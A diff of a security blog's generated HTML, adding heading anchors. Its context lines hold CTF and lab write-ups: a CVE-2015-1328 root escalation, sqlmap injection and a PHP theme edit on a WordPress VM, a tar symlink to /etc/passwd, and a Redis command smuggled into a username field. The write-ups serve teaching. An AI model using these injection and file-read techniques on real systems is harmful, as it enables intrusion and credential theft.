 &lt;p&gt;Well, the ssh port 22 is now open.&lt;/p&gt;
-&lt;h2&gt;SSH&lt;/h2&gt;
+&lt;h2 id="ssh"&gt;SSH&lt;/h2&gt;
 &lt;p&gt;We try to connect to it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6&lt;/span&gt;
 &lt;span class="code-line"&gt;The authenticity of host &amp;#39;10.0.2.6 (10.0.2.6)&amp;#39; can&amp;#39;t be established.&lt;/span&gt;
@@ -4780,7 +4832,7 @@ but this is not so simple this time. Nevertheless we can get a shell buy using
 
 &lt;p&gt;The next step seems to get a beavis or root shell from the butthead one. This a
 privilege escalation.&lt;/p&gt;
-&lt;h2&gt;Guessing&lt;/h2&gt;
+&lt;h2 id="guessing"&gt;Guessing&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; during my long guessing period for privilege escalation I looked at
 the other writeup to see if I missed something but they all used password
 bruteforce. I do not like bruteforce, so I continue looking for something else.&lt;/p&gt;
@@ -4846,7 +4898,7 @@ race condition against it. I have not dig into the subject.&lt;/p&gt;
 &lt;p&gt;I also used
 &lt;a href="http://pentestmonkey.net/tools/audit/unix-privesc-check"&gt;unix-privsec-check&lt;/a&gt;
 in order to search for the privilege escalation.&lt;/p&gt;
-&lt;h2&gt;CVE-2015-1328&lt;/h2&gt;
+&lt;h2 id="cve-2015-1328"&gt;CVE-2015-1328&lt;/h2&gt;
 &lt;p&gt;I had a bit stop to search for the privilege escalation when I saw that an
 exploit as been published for the
 &lt;a href="http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html"&gt;CVE-2015-1328&lt;/a&gt;,
@@ -4864,7 +4916,7 @@ launch it, well it works and give me immediately a root shell.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h1&gt;Conclusion&lt;/h1&gt;
+&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;This was a nice challenge as I learned a lot about the port knocking. The
 privilege escalation was quit interesting to search for and the CVE-2015-1328
 exploitation was a lot of fun.&lt;/p&gt;
@@ -4887,19 +4939,19 @@ creating a sports pages with my time for each race I run.&lt;/p&gt;
 putting the same CSS to pages as to articles and some minors improvements.&lt;/p&gt;
 
 
-&lt;h1&gt;Site changes&lt;/h1&gt;
-&lt;h2&gt;Notes&lt;/h2&gt;
+&lt;h1 id="site-changes"&gt;Site changes&lt;/h1&gt;
+&lt;h2 id="notes"&gt;Notes&lt;/h2&gt;
 &lt;p&gt;There was two part of the website, the /blog and the /notes.
 First of all I moved the about pages which where located in the notes section
 and put it as a &lt;a href="/pages/about.html"&gt;static page in the /blog&lt;/a&gt; part and then I
 moved all the notes into &lt;a href="/pages/notes.html"&gt;a notes page&lt;/a&gt;.&lt;/p&gt;
-&lt;h2&gt;Error page&lt;/h2&gt;
+&lt;h2 id="error-page"&gt;Error page&lt;/h2&gt;
 &lt;p&gt;I remove the 404 page from github to put my own with a link to the
 &lt;a href="/archives.html"&gt;archives&lt;/a&gt; and to the &lt;a href="/pages/notes.html"&gt;notes&lt;/a&gt;.&lt;/p&gt;
-&lt;h2&gt;Categories&lt;/h2&gt;
+&lt;h2 id="categories"&gt;Categories&lt;/h2&gt;
 &lt;p&gt;I Display the category in the menu. A theme change was needed as the original
 one does not handle them.&lt;/p&gt;
-&lt;h2&gt;Plugin&lt;/h2&gt;
+&lt;h2 id="plugin"&gt;Plugin&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;I use the
@@ -4917,14 +4969,14 @@ one does not handle them.&lt;/p&gt;
    tracked).&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2&gt;Favicon&lt;/h2&gt;
+&lt;h2 id="favicon"&gt;Favicon&lt;/h2&gt;
 &lt;p&gt;I add a favicon to the website.&lt;/p&gt;
-&lt;h2&gt;About pages&lt;/h2&gt;
+&lt;h2 id="about-pages"&gt;About pages&lt;/h2&gt;
 &lt;p&gt;I separate the &lt;a href="/pages/about.html"&gt;about page&lt;/a&gt; from the
 &lt;a href="/pages/about-this-website.html"&gt;about website pages&lt;/a&gt; and wrote a &lt;a href="pages/palmares.html"&gt;sport
 page&lt;/a&gt; with my personal records for races and a link to the
 &lt;a href="http://strava.com"&gt;Strava&lt;/a&gt; gps trace.&lt;/p&gt;
-&lt;h1&gt;Theme tweaking&lt;/h1&gt;
+&lt;h1 id="theme-tweaking"&gt;Theme tweaking&lt;/h1&gt;
 &lt;p&gt;It tweak the &lt;a href="https://github.com/kplaube/maggner-pelican"&gt;maggner pelican theme&lt;/a&gt;
 a lot and &lt;a href="https://github.com/maggick/maggner-pelican"&gt;my repository&lt;/a&gt; is in
 advance of a few commits compared to the original one. In fact I add a few
@@ -4973,9 +5025,9 @@ secret hidden in a sensitive file. If you can find the secret, send me an email
 for verification. :)"&lt;/p&gt;
 
 
-&lt;h1&gt;Discovery&lt;/h1&gt;
+&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
 &lt;p&gt;As always we need to know which ports are open.&lt;/p&gt;
-&lt;h2&gt;nmap&lt;/h2&gt;
+&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;# Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5&lt;/span&gt;
 &lt;span class="code-line"&gt;Nmap scan report for 10.0.2.5&lt;/span&gt;
 &lt;span class="code-line"&gt;Host is up (0.00087s latency).&lt;/span&gt;
@@ -5009,7 +5061,7 @@ for verification. :)"&lt;/p&gt;
 &lt;p&gt;&lt;img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;I try to see if there was any differences between this gif and the original
 one, but nothing.&lt;/em&gt;&lt;/p&gt;
-&lt;h2&gt;Nikto&lt;/h2&gt;
+&lt;h2 id="nikto"&gt;Nikto&lt;/h2&gt;
 &lt;p&gt;I like to use &lt;a href="https://cirt.net/Nikto2"&gt;Nikto&lt;/a&gt; when discovering website, I will put only the
 interesting stuff, but I ran &lt;a href="https://cirt.net/Nikto2"&gt;Nikto&lt;/a&gt; on the 3 ports.&lt;/p&gt;
 &lt;p&gt;Port 80:&lt;/p&gt;
@@ -5033,7 +5085,7 @@ look at the wordpress installation.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="wordpress, index" src="/media/2015.04/wordpress_index.png"&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;The directory listening was not of any use. As well the phpmyadmin interface
 was not usefull.&lt;/em&gt;&lt;/p&gt;
-&lt;h2&gt;WPScan&lt;/h2&gt;
+&lt;h2 id="wpscan"&gt;WPScan&lt;/h2&gt;
 &lt;p&gt;We run &lt;a href="https://github.com/wpscanteam/wpscan"&gt;&lt;code&gt;wpscan&lt;/code&gt;&lt;/a&gt; on the 8080 website:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/&lt;/span&gt;
 &lt;span class="code-line"&gt;[+] URL: http://10.0.2.5:8080/wordpress/&lt;/span&gt;
@@ -5094,10 +5146,10 @@ we notice that:&lt;/p&gt;
 &lt;li&gt;proplayer 4.7.9.1 - SQL Injection: Concerns a non available URL (you can run sqlmap on it to confirm this)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Therefore none of this will help us in this challenge.&lt;/p&gt;
-&lt;h1&gt;Exploit&lt;/h1&gt;
+&lt;h1 id="exploit"&gt;Exploit&lt;/h1&gt;
 &lt;p&gt;Nikto shows us some interesting URL. The login interface at &lt;code&gt;login.php&lt;/code&gt; may be
 injectable.&lt;/p&gt;
-&lt;h2&gt;sqlmap&lt;/h2&gt;
+&lt;h2 id="sqlmap"&gt;sqlmap&lt;/h2&gt;
 &lt;p&gt;We need to use burp in order to save the POST request to a file, an then we
 launch &lt;a href="http://sqlmap,org"&gt;sqlmap&lt;/a&gt; on the &lt;code&gt;login.php&lt;/code&gt; URL:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user&lt;/span&gt;
@@ -5174,7 +5226,7 @@ see what are the databases:&lt;/p&gt;
 
 
 &lt;p&gt;So we got some passwords. Then let's use the wordpress password.&lt;/p&gt;
-&lt;h2&gt;Admin, PHP and Flag&lt;/h2&gt;
+&lt;h2 id="admin-php-and-flag"&gt;Admin, PHP and Flag&lt;/h2&gt;
 &lt;p&gt;We got the admin password for &lt;code&gt;http://10.0.2.5:8080/wordpress/wp-login&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png"&gt;&lt;/p&gt;
 &lt;p&gt;As we want to read a file on the system, let's put some PHP code in the theme:
@@ -5222,7 +5274,7 @@ order to execute it, let's get the &lt;code&gt;/etc/passwd&lt;/code&gt; file :&l
 No need to root the system… sadly.&lt;/p&gt;
 &lt;p&gt;As there is not ssh port open, I tried to log on the VM with
 &lt;code&gt;root:SuperSecretPassword&lt;/code&gt; and it simply worked.&lt;/p&gt;
-&lt;h1&gt;Summary&lt;/h1&gt;
+&lt;h1 id="summary"&gt;Summary&lt;/h1&gt;
 &lt;p&gt;This was a simple challenge, based on web pentesting.
 It was a bit short but nonetheless interesting.&lt;/p&gt;
 &lt;p&gt;Road to flag:&lt;/p&gt;
@@ -5255,7 +5307,7 @@ of. All the writeup for this CTF are
 &lt;a href="http://wiki.zenk-security.com/doku.php?id=ndh_2015_quals"&gt;accessible here (in french)&lt;/a&gt;.
 &lt;/p&gt;
 &lt;p&gt;This article is a bit long, so here is the list of the available writeup :&lt;/p&gt;
-&lt;h1&gt;Menu:&lt;/h1&gt;
+&lt;h1 id="menu"&gt;Menu:&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="#facebox"&gt;FaceBox&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#facesec"&gt;FaceSec&lt;/a&gt;&lt;/li&gt;
@@ -5263,10 +5315,10 @@ of. All the writeup for this CTF are
 &lt;li&gt;&lt;a href="#updator"&gt;Updator&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#raptor"&gt;Raptor&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1&gt;FaceBox&lt;/h1&gt;
+&lt;h1 id="facebox"&gt;FaceBox&lt;/h1&gt;
 &lt;p&gt;Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/10&lt;/p&gt;
 &lt;p&gt;http://prod.facebox.challs.nuitduhack.com/&lt;/p&gt;
-&lt;h2&gt;Statement&lt;/h2&gt;
+&lt;h2 id="statement"&gt;Statement&lt;/h2&gt;
 &lt;p&gt;*A shady company decided to write their own software for storing files in the
 cloud.&lt;/p&gt;
 &lt;p&gt;"No no no, this is OUR filebox. We decline any responsability in the usage of our
@@ -5274,15 +5326,15 @@ filebox. In any event your files get lost, trashed, stolen or spy on : it's
 your fault, not ours."&lt;/p&gt;
 &lt;p&gt;You are investigating on the security of their cloud storage as it might have
 disastrous consequences if it were to get hacked by malicious actors.*&lt;/p&gt;
-&lt;h2&gt;Challenge&lt;/h2&gt;
+&lt;h2 id="challenge"&gt;Challenge&lt;/h2&gt;
 &lt;p&gt;The website prod.facebox.challs.nuitduhack.com allow us to create an account and
 log ourself. Then we can upload files on the server both in public and private
 mod. In this case the link to the file is hide to the other users.&lt;/p&gt;
-&lt;h3&gt;File Upload&lt;/h3&gt;
+&lt;h3 id="file-upload"&gt;File Upload&lt;/h3&gt;
 &lt;p&gt;We tried to upload files and execute some code on the server. It was a
 waste of time. Then we think that if there was a prod, there should also be a
 dev.&lt;/p&gt;
-&lt;h3&gt;dev&lt;/h3&gt;
+&lt;h3 id="dev"&gt;dev&lt;/h3&gt;
 &lt;p&gt;With http://dev.facebox.challs.nuitduhack.com/ we found a git project with the
 following tree:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;facebox&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;challs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nuitduhack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;git&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;/span&gt;
@@ -5298,7 +5350,7 @@ last commit messages: &lt;em&gt;hash generation function&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;We can easily retrieve all files on this repository with &lt;code&gt;rip-git.pl&lt;/code&gt;:
 https://github.com/ctfs/write-ups-2014/tree/master/9447-ctf-2014/tumorous
 https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-git.pl&lt;/p&gt;
-&lt;h3&gt;A bit of python&lt;/h3&gt;
+&lt;h3 id="a-bit-of-python"&gt;A bit of python&lt;/h3&gt;
 &lt;p&gt;With &lt;code&gt;rip-git.pl&lt;/code&gt; we found the python script that generate the link of the
 uploaded files:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;
@@ -5319,7 +5371,7 @@ uploaded files:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Private file&lt;/h3&gt;
+&lt;h3 id="private-file"&gt;Private file&lt;/h3&gt;
 &lt;p&gt;We have been asked to test the application security. The private file access
 seems a interesting vulnerability. The first two files were probably upload by
 the staff.
@@ -5360,10 +5412,10 @@ link with the url of the &lt;strong&gt;paste1.txt&lt;/strong&gt; file:&lt;/p&gt;
 &lt;p&gt;We have the complete url to access the private file:
 http://prod.facebox.challs.nuitduhack.com/files/view/35e2cb0b2e8bd40347ecd4e32767a060&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Flag: M4x_M4i5_DR&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;FaceSec&lt;/h1&gt;
+&lt;h1 id="facesec"&gt;FaceSec&lt;/h1&gt;
 &lt;p&gt;Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/11&lt;/p&gt;
 &lt;p&gt;http://facesec.challs.nuitduhack.com/&lt;/p&gt;
-&lt;h2&gt;Statement&lt;/h2&gt;
+&lt;h2 id="statement_1"&gt;Statement&lt;/h2&gt;
 &lt;p&gt;*"Hello there,&lt;/p&gt;
 &lt;p&gt;We are looking for a developer or security consultant to secure our filebox
 system. We stumbled upon your LinkedIn profile and it seems like you would be a
@@ -5371,16 +5423,16 @@ perfect candidate for this job. Could you please send us your CV and Motivation
 letter?&lt;/p&gt;
 &lt;p&gt;Thanks,&lt;/p&gt;
 &lt;p&gt;faceSec HR Director."*&lt;/p&gt;
-&lt;h2&gt;Challenge&lt;/h2&gt;
+&lt;h2 id="challenge_1"&gt;Challenge&lt;/h2&gt;
 &lt;p&gt;This challenge allow us to register an account and then upload text file as
 resume and motivation letter in order to apply for a job.
 We can also upload a compressed file (tar) with a cv.txt and a motiv.txt in
 order to upload both files at the same time.&lt;/p&gt;
-&lt;h3&gt;Facebook&lt;/h3&gt;
+&lt;h3 id="facebook"&gt;Facebook&lt;/h3&gt;
 &lt;p&gt;This challenge looks like the Facebook vulnerability discover last December:
 http://josipfranjkovic.blogspot.fr/2014/12/reading-local-files-from-facebooks.html
 nevertheless we must upload a .tar file instead of a .zip file.&lt;/p&gt;
-&lt;h3&gt;A bit of symbolic link&lt;/h3&gt;
+&lt;h3 id="a-bit-of-symbolic-link"&gt;A bit of symbolic link&lt;/h3&gt;
 &lt;p&gt;We create a &lt;code&gt;cv.txt&lt;/code&gt; file with a symbolic link to &lt;code&gt;/etc/passwd&lt;/code&gt; and a
 &lt;code&gt;motiv.txt&lt;/code&gt; file with random content and then tar the two files:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ln&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;/span&gt;
@@ -5419,17 +5471,17 @@ the server:&lt;/p&gt;
 
 &lt;p&gt;The flag is the content of the &lt;code&gt;User ID Info&lt;/code&gt; of the facesec user.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Flag: W00tSymL1nkAttackStillW0rksIn2k15&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;SecureAuth&lt;/h1&gt;
+&lt;h1 id="secureauth"&gt;SecureAuth&lt;/h1&gt;
 &lt;p&gt;&lt;strong&gt;Thank to &lt;a href="https://twitter.com/_Spl3en"&gt;Spl3en&lt;/a&gt; who redacte this writeup before me.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Exploit | 350 points | http://quals.nuitduhack.com/challenges/view/16&lt;/p&gt;
-&lt;h2&gt;Statement&lt;/h2&gt;
+&lt;h2 id="statement_2"&gt;Statement&lt;/h2&gt;
 &lt;p&gt;*"There is a building. Inside this building there is a level where no elevator
 can go, and no stair can reach. This level is filled with doors. These doors
 lead to many places. Hidden places. But one door is special. One door leads to
 the source." (The Keymaker)&lt;/p&gt;
 &lt;p&gt;Find the key. Open the door.
 Static client @ http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz*&lt;/p&gt;
-&lt;h2&gt;Challenge&lt;/h2&gt;
+&lt;h2 id="challenge_2"&gt;Challenge&lt;/h2&gt;
 &lt;p&gt;The tar.gz file contain the following python program:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;/span&gt;
@@ -5488,7 +5540,7 @@ Static client @ http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz*&lt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;admin&lt;/h3&gt;
+&lt;h3 id="admin"&gt;admin&lt;/h3&gt;
 &lt;p&gt;By replacing &lt;code&gt;username&lt;/code&gt; by &lt;code&gt;admin&lt;/code&gt; we got a different message allowing us to
 think that we got the right user:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;spl3en&lt;/span&gt;&lt;span class="nv"&gt;@box&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SecureAuthClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -5500,7 +5552,7 @@ think that we got the right user:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Errors&lt;/h3&gt;
+&lt;h3 id="errors"&gt;Errors&lt;/h3&gt;
 &lt;p&gt;Moreover, when playing with the username value, for instance by putting
 &lt;code&gt;username"&lt;/code&gt; we got the following message:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;spl3en&lt;/span&gt;&lt;span class="nv"&gt;@box&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SecureAuthClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -5512,7 +5564,7 @@ think that we got the right user:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Redis&lt;/h3&gt;
+&lt;h3 id="redis"&gt;Redis&lt;/h3&gt;
 &lt;p&gt;The error &lt;code&gt;unbalanced quotes in request&lt;/code&gt; seems to be from a Redis server, a
 NoSQL engine. We can see this precise error in the
 &lt;a href="http://download.redis.io/redis-stable/src/networking.c"&gt;&lt;code&gt;networking.c&lt;/code&gt;&lt;/a&gt; file
@@ -5529,7 +5581,7 @@ obtain :&lt;/p&gt;
 
 
 &lt;p&gt;We notice the prefix &lt;code&gt;:name&lt;/code&gt; which have been interpreted as a second command.&lt;/p&gt;
-&lt;h3&gt;Command injection&lt;/h3&gt;
+&lt;h3 id="command-injection"&gt;Command injection&lt;/h3&gt;
 &lt;p&gt;We try to inject &lt;a href="http://redis.io/commands"&gt;Redis commands&lt;/a&gt; like &lt;code&gt;INFO&lt;/code&gt; by
 replacing the username with &lt;code&gt;admin\x0A\x0DINFO\x0A\x0D&lt;/code&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;spl3en&lt;/span&gt;&lt;span class="nv"&gt;@box&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SecureAuthClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -5598,27 +5650,27 @@ password. We get the &lt;code&gt;sha256(admin_passwd)&lt;/code&gt;:
 
 
 &lt;p&gt;&lt;strong&gt;Flag: *INSERT_FUNNY_QUOTE_HERE*&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;Updator&lt;/h1&gt;
+&lt;h1 id="updator"&gt;Updator&lt;/h1&gt;
 &lt;p&gt;Exploit  |  200 points  |  http://quals.nuitduhack.com/challenges/view/9&lt;/p&gt;
 &lt;p&gt;http://updator.challs.nuitduhack.com/&lt;/p&gt;
-&lt;h2&gt;Statement&lt;/h2&gt;
+&lt;h2 id="statement_3"&gt;Statement&lt;/h2&gt;
 &lt;p&gt;*Unhackable : "Not hackable; that cannot be hacked or broken into."&lt;/p&gt;
 &lt;p&gt;We manage updates and thus have fixes, this is not a PS3 as it is unhackable…
 or is it?*&lt;/p&gt;
-&lt;h2&gt;Challenge&lt;/h2&gt;
+&lt;h2 id="challenge_3"&gt;Challenge&lt;/h2&gt;
 &lt;p&gt;The website is a simple page with a login interface for witch we do not have any
 credentials and a &lt;strong&gt;Update&lt;/strong&gt; button.
 When clicking on the button we got the following message from the page
 http://updator.challs.nuitduhack.com/update.py:
 &lt;em&gt;The update managing system is still under construction but will be available soon.&lt;/em&gt;&lt;/p&gt;
-&lt;h3&gt;robots.txt&lt;/h3&gt;
+&lt;h3 id="robotstxt"&gt;robots.txt&lt;/h3&gt;
 &lt;p&gt;The file &lt;code&gt;robots.txt&lt;/code&gt; reveal the folder temp/:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Disallow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In this folder we found a file &lt;code&gt;log.py.encrypted&lt;/code&gt;. How can we decipher it ?&lt;/p&gt;
-&lt;h3&gt;pyc&lt;/h3&gt;
+&lt;h3 id="pyc"&gt;pyc&lt;/h3&gt;
 &lt;p&gt;The &lt;strong&gt;Update&lt;/strong&gt; button call a &lt;code&gt;update.py&lt;/code&gt; file therefor we can try for the
 compiled version of it with the .pyc extension as confirmed by the page
 http://updator.challs.nuitduhack.com/update.pyc&lt;/p&gt;
@@ -5685,7 +5737,7 @@ python program:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;The private key&lt;/h3&gt;
+&lt;h3 id="the-private-key"&gt;The private key&lt;/h3&gt;
 &lt;p&gt;We know the algorithm use to encrypt the &lt;code&gt;log.py.encypted&lt;/code&gt; file: a XOR cipher by
 bloc of 8 characters where the preceding bloc is also XOR with the current one.
 We just need the key. Bruteforcing 8 characters will be too long, we need an
@@ -5751,7 +5803,7 @@ line:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;The logs file&lt;/h3&gt;
+&lt;h3 id="the-logs-file"&gt;The logs file&lt;/h3&gt;
 &lt;p&gt;We decipher the file with the key &lt;strong&gt;6[@dq"&amp;amp;s&lt;/strong&gt; and obtain the following file:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/span&gt;
@@ -5778,12 +5830,12 @@ see the logs:&lt;/p&gt;
 
 &lt;p&gt;We now have the credentials to log ourself in the interface and get the flag.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Flag: zEpbiUFt5p7m84cxOxN6&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;Raptor&lt;/h1&gt;
+&lt;h1 id="raptor"&gt;Raptor&lt;/h1&gt;
 &lt;p&gt;&lt;strong&gt;Thank to &lt;a href="https://twitter.com/_plo_"&gt;Plo&lt;/a&gt; who redact this WRITUP before me.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Misc   \   400 points      http://quals.nuitduhack.com/challenges/view/12&lt;/p&gt;
-&lt;h2&gt;Statement&lt;/h2&gt;
+&lt;h2 id="statement_4"&gt;Statement&lt;/h2&gt;
 &lt;p&gt;No statement, nothing except a link: raptor.challs.nuitduhack.com:4142&lt;/p&gt;
-&lt;h2&gt;Challenge&lt;/h2&gt;
+&lt;h2 id="challenge_4"&gt;Challenge&lt;/h2&gt;
 &lt;p&gt;We connect ourself to the port and the address:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[&lt;span class="nv"&gt;plo&lt;/span&gt;@&lt;span class="nv"&gt;hyperion&lt;/span&gt; &lt;span class="nv"&gt;Misc&lt;/span&gt;]$ &lt;span class="nv"&gt;nc&lt;/span&gt; &lt;span class="nv"&gt;raptor&lt;/span&gt;.&lt;span class="nv"&gt;challs&lt;/span&gt;.&lt;span class="nv"&gt;nuitduhack&lt;/span&gt;.&lt;span class="nv"&gt;com&lt;/span&gt; &lt;span class="mi"&gt;4142&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="o"&gt;~&lt;/span&gt; » &lt;span class="nv"&gt;Welcome&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;Raptor&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;Information&lt;/span&gt; &lt;span class="nv"&gt;Exchange&lt;/span&gt; &lt;span class="nv"&gt;Server&lt;/span&gt;&lt;/span&gt;
@@ -5990,7 +6042,7 @@ the tickets are very rare therefore the SSTIC challenge allows the ones with the
